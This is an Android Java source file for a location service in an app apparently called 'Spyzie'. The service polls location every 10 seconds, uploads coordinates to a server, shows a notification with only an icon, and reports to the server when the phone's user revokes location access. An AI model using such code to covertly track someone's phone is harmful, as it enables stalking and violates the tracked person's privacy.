package com.tantd.spyzie.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.tantd.spyzie.R;
import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.db.DbManager;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.network.ApiManager;
import com.tantd.spyzie.util.CommonUtils;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.NetworkUtils;

import java.util.List;

import javax.inject.Inject;

public class LocationService extends JobIntentService {

    @Inject
    ApiManager mApiManager;
    @Inject
    DbManager mDbManager;

    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final String DEBUG_SUB_TAG = "[" + LocationService.class.getSimpleName() + "] ";

    private static final int JOB_ID = 1;
    private static final int UPDATE_INTERVAL = 10 * 1000;
    private static final int FASTEST_UPDATE_INTERVAL = 10 * 1000;
    private static final int CONDITION_CHECKING_INTERVAL = 5 * 1000;

    private static boolean running;

    private FusedLocationProviderClient mLocationProviderClient;
    private LocationCallback mLocationCallback;

    private boolean isUpdatingLocation;

    private com.tantd.spyzie.data.model.Location lastUpdatedLocation;

    public static void enqueueWork(Context context, Intent intent) {
        enqueueWork(context, LocationService.class, JOB_ID, intent);
    }

    public static void stopAllWork() {
        running = false;
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        running = true;
        isUpdatingLocation = false;
        createNotificationChannelForAndroidO();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_sync)
                .build();

        while (running) {
            boolean hasLocationPermissions = CommonUtils.hasLocationPermissions(this);
            boolean isLocationTurnOn = CommonUtils.isLocationTurnOn(this);
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "hasPermissions=" + hasLocationPermissions
                    + ", isLocationOn=" + isLocationTurnOn);
            if (hasLocationPermissions && isLocationTurnOn) {
                if (!isUpdatingLocation) {
                    Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "Update location & start foreground");
                    startForeground(1, notification);
                    requestLocationUpdates();
                }
                isUpdatingLocation = true;
            } else {
                if (isUpdatingLocation) {
                    Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "Stop updating location");
                    removeLocationUpdates();
                    stopForeground(true);
                    if (!hasLocationPermissions) {
                        mApiManager.sendExceptionTracking(Error.HAS_NO_LOCATION_PERMISSIONS);
                    }
                    if (!isLocationTurnOn) {
                        mApiManager.sendExceptionTracking(Error.LOCATION_IS_OFF);
                    }
                }
                isUpdatingLocation = false;
            }
            try {
                Thread.sleep(CONDITION_CHECKING_INTERVAL);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        running = false;
    }

    private void createNotificationChannelForAndroidO() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private void requestLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest();
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationRequest.setInterval(UPDATE_INTERVAL);
        locationRequest.setFastestInterval(FASTEST_UPDATE_INTERVAL);
        mLocationProviderClient.requestLocationUpdates(locationRequest, mLocationCallback, Looper.getMainLooper());
    }

    private void removeLocationUpdates() {
        mLocationProviderClient.removeLocationUpdates(mLocationCallback);
    }

    @Override
    public void onCreate() {
        SpyzieApplication.getInstance().getServiceComponent().inject(this);
        super.onCreate();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate()");

        mLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
        mLocationCallback = new LocationCallback() {

            @Override
            public void onLocationResult(LocationResult locationResult) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    proceedLocationData(new com.tantd.spyzie.data.model.Location(location.getLatitude(),
                            location.getLongitude()));
                }
            }
        };
    }

    private void proceedLocationData(com.tantd.spyzie.data.model.Location location) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "proceedLocationData, location=" + location
            + ", last=" + lastUpdatedLocation);
        }
        if (!location.isSameValueWith(lastUpdatedLocation)) {
            lastUpdatedLocation = location;
            if (NetworkUtils.isNetworkConnected(this)) {
                List<com.tantd.spyzie.data.model.Location> savedData =
                        (List<com.tantd.spyzie.data.model.Location>) mDbManager.find(com.tantd.spyzie.data.model.Location.class
                                , 0, Constants.MAX_READ_DATA_ENTRIES);
                savedData.add(location);
                mApiManager.sendLocationData(savedData);
                savedData.remove(savedData.size() - 1);
                if (savedData.size() > 0) {
                    mDbManager.removeLocations(savedData);
                }
            } else {
                mDbManager.put(location);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onDestroy()");
        stopAllWork();
    }
}
